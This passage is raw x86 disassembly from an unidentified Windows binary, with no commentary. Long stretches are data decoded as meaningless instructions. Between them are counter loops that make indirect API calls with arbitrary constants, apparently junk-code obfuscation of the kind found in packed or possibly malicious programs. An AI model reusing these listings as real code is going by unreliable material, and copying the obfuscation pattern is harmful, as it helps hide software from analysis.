  401898:	stos   DWORD PTR es:[edi],eax
  401899:	dec    ecx
  40189a:	cmc    
  40189b:	lock loop 0x401842
  40189e:	sahf   
  40189f:	jmp    0xe5ab:0x67ff259a
  4018a6:	add    BYTE PTR [eax-0x7a8ccd3e],dl
  4018ac:	xor    DWORD PTR [edx+0x7c2805d8],eax
  4018b2:	out    dx,al
  4018b3:	mov    BYTE PTR [ebp+0x43940564],ch
  4018b9:	lods   al,BYTE PTR ds:[esi]
  4018ba:	out    0xe5,al
  4018bc:	mov    edx,0x325e6a89
  4018c1:	push   0xfffffffd
  4018c3:	add    DWORD PTR [ebp-0x12af75f7],esp
  4018c9:	imul   esp,DWORD PTR [edi+0x7c],0xfffffffd
  4018cd:	(bad)  
  4018ce:	sbb    ch,BYTE PTR [ecx]
  4018d0:	fstp   TBYTE PTR ds:0x82454160
  4018d6:	stos   DWORD PTR es:[edi],eax
  4018d7:	shr    DWORD PTR [edx+0x76153943],cl
  4018dd:	hlt    
  4018de:	jg     0x40193b
  4018e0:	in     al,0xf5
  4018e2:	and    al,0x89
  4018e4:	sahf   
  4018e5:	out    dx,al
  4018e6:	test   DWORD PTR [ebx-0x6d],esi
  4018e9:	sbb    eax,0x818c5a71
  4018ee:	jp     0x40190e
  4018f0:	pop    esp
  4018f1:	sti    
  4018f2:	sub    esp,ebx
  4018f4:	ror    BYTE PTR [ebp+ebp*8-0x12529e5d],cl
  4018fb:	adc    DWORD PTR [esp+ebx*4-0x4b],esp
  4018ff:	cmp    DWORD PTR [edi+ebx*4],edx
  401902:	sub    eax,0xc673687f
  401907:	fist   DWORD PTR ds:0x9c74e885
  40190d:	rol    DWORD PTR [edi+ebp*2],1
  401910:	adc    edx,ecx
  401912:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401913:	or     BYTE PTR es:[ebx+ebp*8],ah
  401917:	out    0x90,al
  401919:	cmp    eax,0xefee2d08
  40191e:	ror    DWORD PTR [edx-0x5262d5],cl
  401924:	xchg   edx,eax
  401925:	mov    esi,DWORD PTR [eax+0x78]
  401928:	dec    edi
  401929:	push   ss
  40192a:	cmp    al,0xe2
  40192c:	imul   edx,ecx,0xffffffd5
  40192f:	xchg   edi,eax
  401930:	adc    cl,BYTE PTR [ebx-0x2b1613bb]
  401936:	cld    
  401937:	(bad)  
  401938:	dec    DWORD PTR [ebx+0x558bf445]
  40193e:	call   0x8d7ddb76
  401943:	imul   edi,DWORD PTR [edi+eiz*8+0xf],0xfffc5d84
  40194b:	dec    DWORD PTR [ebx+0x81f045]
  401951:	add    DWORD PTR ds:0x4fe90740,esi
  401957:	cld    
  401958:	(bad)  
  401959:	dec    DWORD PTR [ebx+0x3839e445]
  40195f:	je     0x4015a9
  401965:	mov    eax,0x800f1c9c
  40196a:	jmp    0x401622
  40196f:	push   ebp
  401970:	mov    ebp,esp
  401972:	sub    esp,0x44
  401975:	and    DWORD PTR ds:0x4292a1,0x0
  40197f:	mov    edx,DWORD PTR ds:0x4292a1
  401985:	inc    edx
  401986:	mov    DWORD PTR ds:0x4292a1,edx
  40198c:	cmp    DWORD PTR ds:0x4292a1,0x4
  401993:	jne    0x4019a4
  401999:	push   0x6284
  40199e:	call   DWORD PTR ds:0x4278e7
  4019a4:	cmp    DWORD PTR ds:0x4292a1,0x3
  4019ab:	jne    0x4019be
  4019b1:	mov    edx,DWORD PTR ds:0x4292a1
  4019b7:	inc    edx
  4019b8:	mov    DWORD PTR ds:0x4292a1,edx
  4019be:	cmp    DWORD PTR ds:0x4292a1,0x18
  4019c5:	jb     0x40197f
  4019cb:	push   edi
  4019cc:	jmp    0x401aec
  4019d1:	sbb    al,0xdb
  4019d3:	fcmovu st,st(6)
  4019d5:	std    
  4019d6:	sar    DWORD PTR [eax],1
  4019d8:	fstp   QWORD PTR [edi]
  4019da:	or     BYTE PTR [edx-0x64650f03],0x9e
  4019e1:	cld    
  4019e2:	jae    0x401a60
  4019e4:	jl     0x401a57
  4019e6:	jg     0x401a64
  4019e8:	jl     0x4019b7
  4019ea:	arpl   WORD PTR [esi],si
  4019ec:	sbb    bl,dl
  4019ee:	loope  0x4019db
  4019f0:	sub    ah,bh
  4019f2:	in     al,dx
  4019f3:	(bad)  
  4019f4:	out    dx,eax
  4019f5:	repz scas al,BYTE PTR es:[edi]
  4019f7:	add    eax,0x3d18fd3a
  4019fc:	pop    esp
  4019fd:	mov    cl,0x61
  4019ff:	push   0x1
  401a01:	dec    edi
  401a02:	inc    dl
  401a04:	ins    DWORD PTR es:[edi],dx
  401a05:	xor    ah,BYTE PTR [eax+0x72]
  401a08:	jle    0x401a11
  401a0a:	mov    ebp,DWORD PTR [edx-0x7b3a2a27]
  401a10:	enter  0xbb79,0x8e
  401a14:	dec    esp
  401a15:	inc    edx
  401a16:	lods   al,BYTE PTR ds:[esi]
  401a17:	xor    eax,0x7c96ff1a
  401a1c:	dec    esp
  401a1d:	xor    esp,DWORD PTR [ebp-0x48a87504]
  401a23:	sub    BYTE PTR [esi],dh
  401a25:	popf   
  401a26:	mov    esp,0x613db9a1
  401a2b:	test   al,0x9
  401a2d:	clc    
  401a2e:	pop    ss
  401a2f:	xor    ebx,DWORD PTR [esi+eiz*2+0x4993bfa8]
  401a36:	xchg   DWORD PTR [eax+0x77],edi
  401a39:	shr    DWORD PTR [ecx],1
  401a3b:	jp     0x401a95
  401a3d:	into   
  401a3e:	add    eax,0x58d49e7a
  401a43:	and    eax,0xe4714b27
  401a48:	fst    DWORD PTR ds:0x67f39e54
  401a4e:	dec    ecx
  401a4f:	ins    DWORD PTR es:[edi],dx
  401a50:	pop    ecx
  401a51:	lea    eax,[ebx]
  401a53:	sbb    ecx,DWORD PTR ds:0x455ae06
  401a59:	xor    dh,BYTE PTR [edx]
  401a5b:	rcl    BYTE PTR [ecx+0x2f5284a5],1
  401a61:	jb     0x401a9a
  401a63:	sbb    ch,BYTE PTR [edi]
  401a65:	xchg   DWORD PTR [ecx],esi
  401a67:	ins    DWORD PTR es:[edi],dx
  401a68:	sbb    al,0x6
  401a6a:	(bad)  
  401a6b:	test   DWORD PTR gs:[ecx+0x59],ebp
  401a6f:	loop   0x401aa8
  401a71:	xchg   esi,eax
  401a72:	(bad)  
  401a73:	jno    0x401ad1
  401a75:	jg     0x401a2b
  401a77:	lahf   
  401a78:	mov    dl,0x6
  401a7a:	and    ebx,DWORD PTR [ecx]
  401a7c:	fcom   QWORD PTR [esi+0x53128f48]
  401a82:	pushf  
  401a83:	push   edx
  401a84:	in     eax,0xc2
  401a86:	and    al,0x7d
  401a88:	in     eax,dx
  401a89:	pop    es
  401a8a:	inc    esp
  401a8b:	or     al,0xd
  401a8d:	push   eax
  401a8e:	pop    esp
  401a8f:	jmp    0x401b02
  401a91:	rol    DWORD PTR [edi],0x5
  401a94:	das    
  401a95:	bound  esp,QWORD PTR [edi+0x53]
  401a98:	or     eax,0xf34d4af9
  401a9d:	ss push edx
  401a9f:	inc    esi
  401aa0:	mov    bl,0xea
  401aa2:	inc    esi
  401aa3:	jmp    0x401abe
  401aa5:	add    ch,BYTE PTR [ebx+eiz*8+0x41]
  401aa9:	add    BYTE PTR [ebx+0x24],al
  401aac:	mov    ecx,DWORD PTR [ebx+0x30]
  401aaf:	xor    edx,ecx
  401ab1:	xchg   esp,eax
  401ab2:	xchg   ebx,eax
  401ab3:	jns    0x401ab9
  401ab5:	jbe    0x401a8a
  401ab7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401ab8:	adc    ebp,ecx
  401aba:	dec    ebx
  401abb:	pushf  
  401abc:	and    DWORD PTR [ebx+0x65],edi
  401abf:	ss push 0xffffffe3
  401ac2:	or     bl,BYTE PTR [ebx]
  401ac4:	mov    esi,edi
  401ac6:	stos   BYTE PTR es:[edi],al
  401ac7:	xor    DWORD PTR [ebx-0x761fb5c4],ebx
  401acd:	add    eax,0x2391595b
  401ad2:	iret   
  401ad3:	int    0xc8
  401ad5:	loope  0x401a9a
  401ad7:	pop    eax
  401ad8:	xor    DWORD PTR [eax+esi*4],0x28
  401adc:	jne    0x401b0d
  401ade:	xor    BYTE PTR [edi],bl
  401ae0:	out    dx,al
  401ae1:	repnz retf 0x5d22
  401ae5:	xchg   edi,eax
  401ae6:	lods   al,BYTE PTR ds:[esi]
  401ae7:	xor    esi,ebp
  401ae9:	fs add al,0xe4
  401aec:	mov    eax,DWORD PTR [ebp+0xc]
  401aef:	and    DWORD PTR ds:0x4292cd,0x0
  401af9:	jmp    0x401b0b
  401afe:	mov    ecx,DWORD PTR ds:0x4292cd
  401b04:	inc    ecx
  401b05:	mov    DWORD PTR ds:0x4292cd,ecx
  401b0b:	cmp    DWORD PTR ds:0x4292cd,0x11
  401b12:	jae    0x401b69
  401b18:	cmp    DWORD PTR ds:0x4292cd,0x4
  401b1f:	jne    0x401b40
  401b25:	push   0x3f75
  401b2a:	push   0x4292cd
  401b2f:	push   DWORD PTR [ebp-0xc]
  401b32:	push   DWORD PTR [ebp-0xc]
  401b35:	push   0x5572
  401b3a:	call   DWORD PTR ds:0x4279bb
  401b40:	cmp    DWORD PTR ds:0x4292cd,0x3
  401b47:	jne    0x401b5a
  401b4d:	mov    ecx,DWORD PTR ds:0x4292cd
  401b53:	inc    ecx
  401b54:	mov    DWORD PTR ds:0x4292cd,ecx
  401b5a:	jmp    0x401afe
  401b5f:	mov    DWORD PTR ds:0x4292c9,0x72d4
  401b69:	mov    DWORD PTR [ebp-0x10],eax
  401b6c:	and    DWORD PTR ds:0x42c882,0x0
  401b76:	jmp    0x401b8a
  401b7b:	xor    ecx,ecx
  401b7d:	xor    ecx,DWORD PTR ds:0x42c882
  401b83:	inc    ecx
  401b84:	mov    DWORD PTR ds:0x42c882,ecx
  401b8a:	cmp    DWORD PTR ds:0x42c882,0x1c
  401b91:	jae    0x401bde
  401b97:	cmp    DWORD PTR ds:0x42c882,0x6
  401b9e:	jne    0x401bb9
  401ba4:	push   0x3a01
  401ba9:	push   0x1f68
  401bae:	push   0x4e47
  401bb3:	call   DWORD PTR ds:0x4278eb
  401bb9:	cmp    DWORD PTR ds:0x42c882,0x5
  401bc0:	jne    0x401bd3
  401bc6:	mov    ecx,DWORD PTR ds:0x42c882
  401bcc:	inc    ecx
  401bcd:	mov    DWORD PTR ds:0x42c882,ecx
  401bd3:	jmp    0x401b7b
  401bd8:	or     edx,0x1630
  401bde:	mov    eax,DWORD PTR [ebp+0x8]
  401be1:	mov    DWORD PTR [ebp+0x8],0xf89c8535
  401be8:	mov    DWORD PTR [ebp-0x20],0xf89c8534
  401bef:	mov    ecx,DWORD PTR ds:0x42c886
  401bf5:	xor    DWORD PTR ds:0x4292cd,ecx
  401bfb:	mov    edx,DWORD PTR [ebp+0x8]
  401bfe:	sbb    DWORD PTR ds:0x427d1f,0x4512
  401c08:	mov    DWORD PTR [ebp-0x40],eax
  401c0b:	mov    eax,0x7510857
  401c10:	adc    ecx,0xd62
  401c16:	jmp    0x401d36
  401c1b:	adc    eax,DWORD PTR [ecx-0x2451948]
  401c21:	push   ebp
  401c22:	pop    ebp
  401c23:	aaa    
  401c24:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401c25:	popa   
  401c26:	lods   al,BYTE PTR ds:[esi]
  401c27:	ins    BYTE PTR es:[edi],dx
  401c28:	add    al,0x3
  401c2a:	pop    esi
  401c2b:	icebp  
  401c2c:	jb     0x401caa
  401c2e:	jl     0x401ca1
  401c30:	jg     0x401cae
  401c32:	jl     0x401c95
  401c34:	mov    cl,0xce
  401c36:	push   esp
  401c37:	loopne 0x401c07
  401c39:	fsub   QWORD PTR [eax]
  401c3b:	mov    esp,0x77f28c2d
  401c40:	dec    ebx
  401c41:	jle    0x401c99
  401c43:	cmp    edx,DWORD PTR [ebx-0x20]
  401c46:	repnz mov bl,0x38
  401c49:	aad    0xb
  401c4b:	dec    edx
  401c4c:	test   esp,edx
  401c4e:	sbb    BYTE PTR [ebp+0x28444bc7],bh
  401c54:	cwde   
  401c55:	push   esi
  401c56:	sub    ah,BYTE PTR [ebp-0x637fac5f]
  401c5c:	retf   
  401c5d:	loope  0x401c56
  401c5f:	in     eax,dx
  401c60:	xor    al,0xac
  401c62:	mov    esp,cs
  401c64:	ficomp DWORD PTR [esi+ecx*8-0x1e]
  401c68:	pop    ds
  401c69:	adc    al,0xd3
  401c6b:	xchg   edi,eax
  401c6c:	jb     0x401c21
  401c6e:	mov    dl,0xc4
  401c70:	sub    DWORD PTR [edi+0x456f404a],edi
  401c76:	sbb    DWORD PTR [eax+0x5ddd6c72],ebp
  401c7c:	in     eax,0x25
  401c7e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401c7f:	(bad)  
  401c80:	leave  
  401c81:	out    0xed,eax
  401c83:	and    eax,0x30f352ec
  401c88:	aaa    
  401c89:	add    al,BYTE PTR [ecx]
  401c8b:	mov    edx,0x3bd33d4c
  401c90:	inc    esp
  401c91:	neg    DWORD PTR [ebp-0x4f48e037]
  401c97:	adc    eax,0x76c5b8aa
  401c9c:	sbb    ebp,DWORD PTR [edi]
  401c9e:	push   edx
  401c9f:	(bad)  
  401ca0:	xlat   BYTE PTR ds:[ebx]
  401ca1:	cmp    esi,ecx
  401ca3:	xor    bl,BYTE PTR [eax+edi*2]
  401ca6:	pop    ss
  401ca7:	push   edx
  401ca8:	cmp    ebx,edx
  401caa:	je     0x401cff
  401cac:	mov    ds:0xf84bf61a,eax
  401cb1:	mov    ebx,fs
  401cb3:	jne    0x401d11
  401cb5:	lods   eax,DWORD PTR ds:[esi]
  401cb6:	ins    DWORD PTR es:[edi],dx
  401cb7:	add    esp,esp
  401cb9:	pop    ss
  401cba:	out    0x69,al
  401cbc:	cmp    eax,0xcc18cf81
  401cc1:	pop    ebx
  401cc2:	jae    0x401c8a
  401cc4:	dec    ebp
  401cc5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401cc6:	loope  0x401d37
  401cc8:	jmp    0xeb16:0xbde7b100
  401ccf:	jne    0x401c76
  401cd1:	xchg   ecx,eax
  401cd2:	xchg   ecx,eax
  401cd3:	pop    esp
  401cd4:	sub    eax,DWORD PTR [ebx+eiz*4+0x70c64a5a]
  401cdb:	push   edx
  401cdc:	clc    
  401cdd:	cwde   
  401cde:	in     al,0x87
  401ce0:	daa    
  401ce1:	add    DWORD PTR [edi+0x32],ebp
  401ce4:	jns    0x401cc2
  401ce6:	mov    bl,0xb3
  401ce8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401ce9:	mov    dl,0x76
  401ceb:	mov    edx,0x567351d
  401cf0:	test   DWORD PTR [eax+0xfb72532],0x27ae2d6
  401cfa:	dec    esi
  401cfb:	fcom   DWORD PTR [ebp+0x58]
  401cfe:	sbb    al,0xdd
  401d00:	lds    esi,FWORD PTR [edx]
  401d02:	je     0x401d38
  401d04:	pop    ebx
  401d05:	rcl    BYTE PTR [eax-0x3bc7dd60],0x35
  401d0c:	add    BYTE PTR [eax+ecx*4],bl
  401d0f:	or     al,0xd3
  401d11:	shl    DWORD PTR [edi],1
  401d13:	shl    BYTE PTR [ebx+0x7d],cl
  401d16:	and    BYTE PTR cs:[ebx],0xa5
  401d1a:	sub    eax,0x28aac0ff
  401d1f:	xchg   ebp,eax
  401d20:	jmp    0x27ee:0x614a2570
  401d27:	xor    eax,0xefacbc7
  401d2c:	les    edx,FWORD PTR [ebx-0x2d]
  401d2f:	pushf  
  401d30:	jo     0x401d25
  401d32:	(bad)  
  401d33:	jmp    0x401d8b
  401d35:	push   0x1581d033
  401d3a:	rcl    DWORD PTR [edx+0x3cb60042],0x0
  401d41:	add    cl,ch
  401d43:	sbb    eax,DWORD PTR [ecx]
  401d45:	add    BYTE PTR [eax],al
  401d47:	(bad)  
  401d48:	mov    eax,0x13bd709b
  401d4d:	cdq    
  401d4e:	mov    edx,0x91382f2
  401d53:	jle    0x401d52
  401d55:	adc    eax,0x7c75f2fb
  401d5a:	jl     0x401dcd
  401d5c:	jg     0x401dda
  401d5e:	jl     0x401d99
  401d60:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401d61:	mov    eax,ds:0x7ef57547
  401d66:	data16 jge 0x401de1
  401d69:	in     eax,dx
  401d6a:	cmp    eax,0x49369463
  401d6f:	lock and ebp,DWORD PTR [edx]
  401d72:	aas    
  401d73:	loope  0x401cfc
  401d75:	sbb    edi,edx
  401d77:	das    
  401d78:	fdivr  st,st(5)
  401d7a:	sub    ecx,esp
  401d7c:	sub    eax,0xffffff98
  401d7f:	pop    esi
  401d80:	div    DWORD PTR [ebx]
  401d82:	jl     0x401d30
  401d84:	pop    ebx
  401d85:	pusha  
  401d86:	mov    esi,0xbab34f48
  401d8b:	pop    edi
  401d8c:	pop    ds
  401d8d:	inc    esi
  401d8e:	stos   BYTE PTR es:[edi],al
  401d8f:	dec    esp
  401d90:	mov    esi,0x94fbe07e
  401d95:	and    BYTE PTR [eax],dl
  401d97:	jb     0x401e0e
  401d99:	xchg   edi,eax
  401d9a:	std    
  401d9b:	bnd jmp DWORD PTR ds:0xc848f9e1
  401da2:	ja     0x401d4d
  401da4:	dec    eax
  401da5:	outs   dx,DWORD PTR ds:[esi]
  401da6:	clc    
  401da7:	aam    0x96
  401da9:	xchg   DWORD PTR [ebx],edx
  401dab:	out    0x3c,eax
  401dad:	lock test al,0x91
  401db0:	sbb    edi,0x461073bd
  401db6:	push   edx
  401db7:	sbb    ecx,DWORD PTR [ebx+0x10e041e7]
  401dbd:	mov    bh,0x19
  401dbf:	pop    es
  401dc0:	push   esp
  401dc1:	call   0x34b56a92
  401dc6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401dc7:	idiv   DWORD PTR [eax+edx*8-0x53]
  401dcb:	mov    cl,0x9b
  401dcd:	and    DWORD PTR gs:[esi-0x2f],ebp
  401dd1:	and    ebx,DWORD PTR [esi+0x1441ffa1]
  401dd7:	push   0xfa5eb13d
  401ddc:	and    al,0xc3
  401dde:	jg     0x401d8c
  401de0:	pop    ds
  401de1:	jns    0x401e0e
  401de3:	ds push cs
  401de5:	xchg   esi,eax
  401de6:	jb     0x401e4f
  401de8:	sar    BYTE PTR [ecx-0x77],0x4c
  401dec:	mov    dh,0x6b
  401dee:	loopne 0x401dc2
  401df0:	scas   al,BYTE PTR es:[edi]
  401df1:	jo     0x401e05
  401df3:	jge    0x401e18
  401df5:	cmp    BYTE PTR [edi+0x6fca82c6],bl
  401dfb:	jg     0x401e49
  401dfd:	fmul   DWORD PTR [ebp+0x121d932b]
  401e03:	arpl   WORD PTR [esi+0x7ea941af],dx
  401e09:	clc    
  401e0a:	in     eax,0xc9
  401e0c:	leave  
  401e0d:	mov    dh,0x4c
  401e0f:	jmp    0x401e78
  401e11:	mul    BYTE PTR [edx+0x706d68a5]
  401e17:	adc    edx,DWORD PTR [ebx]
  401e19:	push   edi
  401e1a:	xchg   edx,eax
  401e1b:	fucomp st(7)
  401e1d:	xchg   edx,eax
  401e1e:	xor    ch,BYTE PTR [edx-0x1]
  401e21:	daa    
  401e22:	pusha  
  401e23:	add    eax,0x8eaec18
  401e28:	jns    0x401e7e
  401e2a:	lds    eax,FWORD PTR [ecx-0x764f8dc5]
  401e30:	pop    esi
  401e31:	call   0x40df:0x4befdc8f
  401e38:	mov    esp,0x84c07e28
  401e3d:	fsubr  DWORD PTR [eax]
  401e3f:	mov    bl,0x82
  401e41:	jnp    0x401de8
  401e43:	fbld   TBYTE PTR [ecx+ecx*8+0x215e1572]
  401e4a:	and    DWORD PTR [eax-0x1b3bcf85],edi
  401e50:	cmp    bl,BYTE PTR [ecx-0x6d]
  401e53:	jne    0x401e29
  401e55:	ds call 0xec45242e
  401e5b:	mov    esi,0x63a0d9c7
  401e60:	jnp    0x401e9e
  401e62:	mov    ecx,0x32729e
  401e67:	adc    DWORD PTR ds:0x427d17,ecx
  401e6d:	add    edx,ecx
  401e6f:	and    edi,DWORD PTR ds:0x4292a1
  401e75:	mov    DWORD PTR [ebp-0x8],edx
  401e78:	adc    DWORD PTR ds:0x427d07,0x2336
  401e82:	mov    edx,DWORD PTR [ebp+0x8]
  401e85:	and    DWORD PTR ds:0x427d1b,0x0
  401e8f:	mov    edi,DWORD PTR ds:0x427d1b
  401e95:	inc    edi
  401e96:	mov    DWORD PTR ds:0x427d1b,edi
  401e9c:	cmp    DWORD PTR ds:0x427d1b,0x2b
  401ea3:	jne    0x401eb2
  401ea9:	push   DWORD PTR [ebp-0x1c]
  401eac:	call   DWORD PTR ds:0x427a8b
  401eb2:	cmp    DWORD PTR ds:0x427d1b,0x1e
  401eb9:	jb     0x401e8f
  401ebf:	mov    edi,DWORD PTR ds:0x4292d9
  401ec5:	and    DWORD PTR ds:0x427d13,edi
  401ecb:	xor    edx,eax
  401ecd:	adc    edi,DWORD PTR ds:0x4292c9
  401ed3:	add    edx,ecx
  401ed5:	mov    DWORD PTR ds:0x4275b0,0x10
  401edf:	cmp    DWORD PTR ds:0x4275b0,0x0
  401ee6:	je     0x401f33
  401eec:	cmp    DWORD PTR ds:0x4275b0,0x6
  401ef3:	jne    0x401f07
  401ef9:	push   DWORD PTR [ebp-0x10]
  401efc:	push   0x12c3
  401f01:	call   DWORD PTR ds:0x4279bf
  401f07:	cmp    DWORD PTR ds:0x4275b0,0x7
  401f0e:	jne    0x401f21
  401f14:	mov    edi,DWORD PTR ds:0x4275b0
  401f1a:	dec    edi
  401f1b:	mov    DWORD PTR ds:0x4275b0,edi
  401f21:	mov    edi,DWORD PTR ds:0x4275b0
  401f27:	dec    edi
  401f28:	mov    DWORD PTR ds:0x4275b0,edi
  401f2e:	jmp    0x401edf
  401f33:	mov    DWORD PTR [ebp+0xc],edx
  401f36:	mov    DWORD PTR [ebp-0x4],0xf89c85d5
  401f3d:	xor    edi,edi
  401f3f:	add    edi,DWORD PTR ds:0x427d1f
  401f45:	adc    DWORD PTR ds:0x4292c9,edi
  401f4b:	mov    DWORD PTR [ebp-0x28],0xf89c8533
  401f52:	mov    DWORD PTR [ebp-0x2c],0xf89c8532
  401f59:	and    DWORD PTR ds:0x42c896,0x0
  401f63:	jmp    0x401f77
  401f68:	xor    edi,edi
  401f6a:	or     edi,DWORD PTR ds:0x42c896
  401f70:	inc    edi
  401f71:	mov    DWORD PTR ds:0x42c896,edi
  401f77:	cmp    DWORD PTR ds:0x42c896,0x1c
  401f7e:	jae    0x401fc4
  401f84:	cmp    DWORD PTR ds:0x42c896,0xe
  401f8b:	jne    0x401fa3
  401f91:	push   0x0
  401f93:	push   0x55c0
  401f98:	push   0x3960
  401f9d:	call   DWORD PTR ds:0x427a8f
  401fa3:	cmp    DWORD PTR ds:0x42c896,0xd
  401faa:	jne    0x401fbd
  401fb0:	mov    edi,DWORD PTR ds:0x42c896
  401fb6:	inc    edi
  401fb7:	mov    DWORD PTR ds:0x42c896,edi
  401fbd:	jmp    0x401f68
  401fc2:	and    edi,edi
  401fc4:	mov    DWORD PTR [ebp-0x30],0xf89c8531
  401fcb:	mov    DWORD PTR [ebp-0x34],0xf89c8530
  401fd2:	and    DWORD PTR ds:0x4292bd,0x0
  401fdc:	mov    edi,DWORD PTR ds:0x4292bd
  401fe2:	inc    edi
  401fe3:	mov    DWORD PTR ds:0x4292bd,edi
  401fe9:	cmp    DWORD PTR ds:0x4292bd,0x15
  401ff0:	jne    0x402006
  401ff6:	push   0x3d92
  401ffb:	push   0x4275c4
  402000:	call   DWORD PTR ds:0x4279c3
  402006:	cmp    DWORD PTR ds:0x4292bd,0x12
  40200d:	jb     0x401fdc
  402013:	and    edi,0x7576
  402019:	jmp    0x402139
  40201e:	loopne 0x402062
  402020:	sbb    edx,ebp
  402022:	mov    ecx,0xbb5ae36d
  402027:	xchg   esp,eax
  402028:	inc    eax
  402029:	pop    es
  40202a:	sbb    ebx,DWORD PTR [edx+0x74f784e9]
  402030:	jl     0x4020ae
  402032:	jno    0x4020b3
  402034:	jl     0x4020b2
  402036:	cli    
  402037:	mov    edi,0x1c9757b5
  40203c:	push   es
  40203d:	or     DWORD PTR [edx],edx
  40203f:	inc    BYTE PTR [ebx-0x74]
  402042:	aad    0x52
  402044:	ficomp DWORD PTR [eax+0x33]
  402047:	(bad)  
  402048:	inc    esi
  402049:	sbb    ebp,ecx
  40204b:	dec    edx
  40204c:	fs (bad) 
  40204e:	pop    es
  40204f:	sub    DWORD PTR [ecx-0x7ab529c6],esp
  402055:	ret    
  402056:	sar    ah,0xd5
  402059:	inc    edi
  40205a:	jmp    0x4020c8
  40205c:	fist   WORD PTR [eax+0x29cfbebf]
  402062:	loopne 0x402060
  402064:	data16 jnp 0x40208e
  402067:	mov    dh,0xb
  402069:	(bad)  
  40206b:	adc    al,0xae
  40206d:	cdq    
  40206e:	push   cs
  40206f:	add    al,0xa3
  402071:	push   cs
  402072:	icebp  
  402073:	pop    ebp
  402074:	test   DWORD PTR [edx],0x88732df2
  40207a:	xchg   esi,eax
  40207b:	icebp  
  40207c:	jb     0x4020b9
  40207e:	loope  0x4020a0
  402080:	inc    ecx
  402081:	aad    0xff
  402083:	sar    DWORD PTR [edi+0x64],0x1c
  402087:	xchg   edx,eax
  402088:	xchg   DWORD PTR [edx-0x23bae722],ebp
  40208e:	dec    esi
  40208f:	adc    DWORD PTR [ebp+0x1c],0xffffffaa
  402093:	not    eax
  402095:	push   ecx
  402096:	add    edi,edi
  402098:	dec    esi
  402099:	push   ebx
  40209a:	xor    al,0xba
  40209c:	iret   
  40209d:	lahf   
  40209e:	cld    
  40209f:	sbb    BYTE PTR [eax],ch
  4020a1:	lods   al,BYTE PTR ds:[esi]
  4020a2:	loopne 0x40206b
  4020a4:	ja     0x4020a9
  4020a6:	push   ebp
  4020a7:	sbb    al,0xc2
  4020a9:	jo     0x4020ed
  4020ab:	retf   
  4020ac:	loopne 0x4020da
  4020ae:	sub    edi,DWORD PTR [eax-0x50]
  4020b1:	jmp    0xa336:0x5aa1e3bd
  4020b8:	xchg   esi,eax
  4020b9:	cdq    
  4020ba:	jbe    0x4020b3
  4020bc:	push   0xaf32cc27
  4020c1:	jp     0x402080
  4020c3:	stc    
  4020c4:	popf   
  4020c5:	dec    ebp
  4020c6:	stc    
  4020c7:	cwde   
  4020c8:	stos   BYTE PTR es:[edi],al
  4020c9:	cmc    
  4020ca:	lods   eax,DWORD PTR ds:[esi]
  4020cb:	popf   
  4020cc:	add    DWORD PTR [esi+edx*8-0x72843ae9],ebp
  4020d3:	cmp    BYTE PTR [edx],al
  4020d5:	into   
  4020d6:	pop    ebp
  4020d7:	mov    edx,0x6734b34
  4020dd:	js     0x402096
  4020df:	gs push esi
  4020e1:	ss pop edi
  4020e3:	or     DWORD PTR [edi-0x75],0x50cc51a
  4020ea:	push   edi
  4020eb:	pop    ss
  4020ec:	cli    
  4020ed:	test   BYTE PTR [edx-0x43],cl
  4020f0:	adc    BYTE PTR [edi],cl
  4020f2:	jmp    0xc8354651
  4020f7:	sub    al,0x78
  4020f9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4020fa:	std    
  4020fb:	push   ebp
  4020fc:	or     DWORD PTR [eax+0x2af21a72],edi
  402102:	gs push cs
  402104:	leave  
  402105:	xlat   BYTE PTR ds:[bx]
  402107:	inc    ebx
  402108:	es inc ebp
  40210a:	(bad)  
  40210b:	mov    al,0x65
  40210d:	fisubr WORD PTR [eax+0x4bb4d64b]
  402113:	mov    eax,0x85d6f0c7
  402118:	push   ebp
  402119:	fld    DWORD PTR [edx-0x6e5190be]
  40211f:	rcl    DWORD PTR [edi-0x3],cl
  402122:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402123:	jns    0x402102
  402125:	mov    ds:0x5f9f7a51,eax
  40212a:	pop    esi
  40212b:	pop    edx
  40212c:	into   
  40212d:	cmp    DWORD PTR [edx],ebx
  40212f:	arpl   WORD PTR [ecx-0x58fc2075],bp
  402135:	sbb    BYTE PTR [ebx],0x75
  402138:	stos   BYTE PTR es:[edi],al
  402139:	mov    DWORD PTR [ebp-0x38],0xf89c853f
  402140:	mov    DWORD PTR [ebp-0x3c],0xf89c853e
  402147:	or     edx,edi
  402149:	mov    edx,DWORD PTR [ebp+0x8]
  40214c:	xor    edx,eax
  40214e:	mov    edi,DWORD PTR [ebp-0x10]
  402151:	neg    DWORD PTR ds:0x4292b5
  402157:	add    edx,ecx
  402159:	mov    DWORD PTR ds:0x4292bd,0x7886
  402163:	cmp    edi,edx
  402165:	je     0x402c82
  40216b:	mov    DWORD PTR ds:0x4292c5,0x3488
  402175:	push   ebx
  402176:	jmp    0x402c5d
  40217b:	mov    edx,DWORD PTR [ebp-0x8]
  40217e:	or     DWORD PTR ds:0x42c892,0x427cf7
  402188:	mov    edi,DWORD PTR [ebp-0x10]
  40218b:	mov    DWORD PTR ds:0x4292c1,0x6c77
  402195:	sub    edi,edx
  402197:	and    DWORD PTR ds:0x4292dd,0x0
  4021a1:	mov    edx,DWORD PTR ds:0x4292dd
  4021a7:	inc    edx
  4021a8:	mov    DWORD PTR ds:0x4292dd,edx
  4021ae:	cmp    DWORD PTR ds:0x4292dd,0x8
  4021b5:	jne    0x4021c9
  4021bb:	push   0x61e8
  4021c0:	push   DWORD PTR [ebp-0x14]
  4021c3:	call   DWORD PTR ds:0x4279c7
  4021c9:	cmp    DWORD PTR ds:0x4292dd,0x7
  4021d0:	jne    0x4021e3
  4021d6:	mov    edx,DWORD PTR ds:0x4292dd
  4021dc:	inc    edx
  4021dd:	mov    DWORD PTR ds:0x4292dd,edx
  4021e3:	cmp    DWORD PTR ds:0x4292dd,0x1a
  4021ea:	jb     0x4021a1
  4021f0:	xor    DWORD PTR ds:0x427cf7,0x6435
